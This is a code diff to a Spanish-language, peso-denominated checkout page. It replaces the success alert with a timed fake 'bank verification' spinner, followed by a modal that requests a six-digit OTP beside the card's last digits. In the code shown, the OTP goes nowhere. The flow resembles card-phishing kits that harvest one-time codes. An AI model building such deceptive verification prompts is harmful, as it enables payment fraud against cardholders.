@@ -757,9 +757,13 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.status === 'OK') {
-                            alert('✅ Transacción registrada correctamente. ID: ' + data.id);
-                            sessionStorage.clear();
-                            window.location.href = 'busqueda.html';
+                            // Mostrar modal de LOAD
+                            showLoadingModal(tarjetaNumero, userNombre, userApellido, finalAmount, nombreConjunto);
+
+                            // Después de 10 segundos, mostrar OTP
+                            setTimeout(() => {
+                                showOTPModal(tarjetaNumero, userNombre, userApellido, finalAmount, nombreConjunto);
+                            }, 10000);
                         } else {
                             // Mostrar mensaje amigable, no técnico
                             alert('❌ No se pudo procesar el pago. Por favor intenta de nuevo.');
@@ -789,6 +793,91 @@
         function togglePaymentMethods() {
             const methods = document.querySelector('.payment-methods');
             methods.classList.toggle('show');
+        }
+
+        // Modal LOAD (espera 10 segundos)
+        function showLoadingModal(tarjeta, nombre, apellido, monto, comercio) {
+            const html = `
+                <div id="loadingModal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 2000;">
+                    <div style="background: white; border-radius: 16px; padding: 60px 40px; text-align: center; max-width: 500px;">
+                        <div style="display: inline-block; width: 60px; height: 60px; border: 5px solid #f0f0f0; border-top-color: #1dbe5f; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                        <h2 style="color: #2e0063; margin: 30px 0 15px 0; font-size: 24px;">Esperando verificación</h2>
+                        <p style="color: #666; font-size: 16px; margin: 0;">con el banco...</p>
+                        <style>
+                            @keyframes spin {
+                                to { transform: rotate(360deg); }
+                            }
+                        </style>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', html);
+        }
+
+        // Modal OTP
+        function showOTPModal(tarjeta, nombre, apellido, monto, comercio) {
+            // Remover modal de loading si existe
+            const loadingModal = document.getElementById('loadingModal');
+            if (loadingModal) loadingModal.remove();
+
+            const totalFormatted = new Intl.NumberFormat('es-CO', {
+                style: 'currency',
+                currency: 'COP',
+                minimumFractionDigits: 0
+            }).format(monto);
+
+            const html = `
+                <div id="otpModalOverlay" style="position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 2000;">
+                    <div style="background: white; border-radius: 16px; padding: 40px; max-width: 500px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
+                        <div style="display: flex; justify-content: center; margin-bottom: 20px; font-size: 48px;">📱</div>
+
+                        <h2 style="color: #2e0063; margin: 0 0 10px 0; font-size: 24px; font-weight: 700; text-align: center;">Ingrese Código OTP</h2>
+                        <p style="color: #666; font-size: 14px; margin: 0 0 25px 0; text-align: center;">Revise su SMS o aplicación bancaria para obtener el código.</p>
+
+                        <div style="background: #f5f5f5; padding: 20px; border-radius: 12px; margin-bottom: 25px;">
+                            <div style="text-align: left; margin-bottom: 15px;">
+                                <div style="font-size: 12px; color: #666; font-weight: 600; margin-bottom: 5px;">Comercio:</div>
+                                <div style="font-size: 16px; font-weight: 700; color: #333;">${comercio || '—'}</div>
+                            </div>
+                            <div style="text-align: left; margin-bottom: 15px;">
+                                <div style="font-size: 12px; color: #666; font-weight: 600; margin-bottom: 5px;">Monto:</div>
+                                <div style="font-size: 16px; font-weight: 700; color: #333;">${totalFormatted}</div>
+                            </div>
+                            <div style="text-align: left;">
+                                <div style="font-size: 12px; color: #666; font-weight: 600; margin-bottom: 5px;">Tarjeta:</div>
+                                <div style="font-size: 16px; font-weight: 700; color: #333;">**** **** **** ${tarjeta.slice(-4)}</div>
+                            </div>
+                        </div>
+
+                        <div style="margin-bottom: 25px;">
+                            <label style="font-size: 12px; color: #666; display: block; margin-bottom: 8px; font-weight: 600; text-align: left;">Código OTP (6 dígitos):</label>
+                            <input type="text" id="otpInput" placeholder="000000" maxlength="6" style="width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 18px; text-align: center; font-family: monospace; letter-spacing: 4px;" />
+                        </div>
+
+                        <button id="btnContinuarOTP" style="width: 100%; padding: 14px; background: #1dbe5f; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.3s;">Continuar</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', html);
+
+            // Focus en input
+            setTimeout(() => {
+                document.getElementById('otpInput').focus();
+            }, 100);
+
+            // Botón Continuar
+            document.getElementById('btnContinuarOTP').addEventListener('click', function() {
+                const otp = document.getElementById('otpInput').value;
+                if (!otp || otp.length !== 6) {
+                    alert('Por favor ingresa un código OTP válido (6 dígitos)');
+                    return;
+                }
+                // TODO: Aquí se procesaría el OTP
+                alert('✅ OTP confirmado: ' + otp);
+                document.getElementById('otpModalOverlay').remove();
+                sessionStorage.clear();
+                window.location.href = 'busqueda.html';
+            });
         }
     </script>
 </body>
